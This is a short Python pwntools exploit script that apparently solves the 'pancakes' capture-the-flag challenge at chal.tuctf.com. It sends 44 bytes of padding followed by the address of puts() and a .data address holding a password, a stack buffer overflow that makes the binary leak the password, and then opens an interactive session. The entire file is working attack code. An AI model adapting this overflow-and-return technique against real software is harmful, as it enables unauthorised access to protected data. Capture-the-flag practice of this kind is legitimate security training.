#!/usr/bin/python3

from pwn import *
import sys

context.log_level = 'debug'

def exploit():
    payload = b""
    payload += b"A"*44
    payload += p32(0x08049060) # puts()
    payload += p32(0x0804c060) # password in .data
    payload += p32(0x0804c060) # password in .data

    return payload

def main():

    #target = process("./pancakes")
    target = remote("chal.tuctf.com", 30503)
    target.recvuntil(b"> ")

    payload = exploit()
    target.sendline(payload)

    target.interactive()

main()
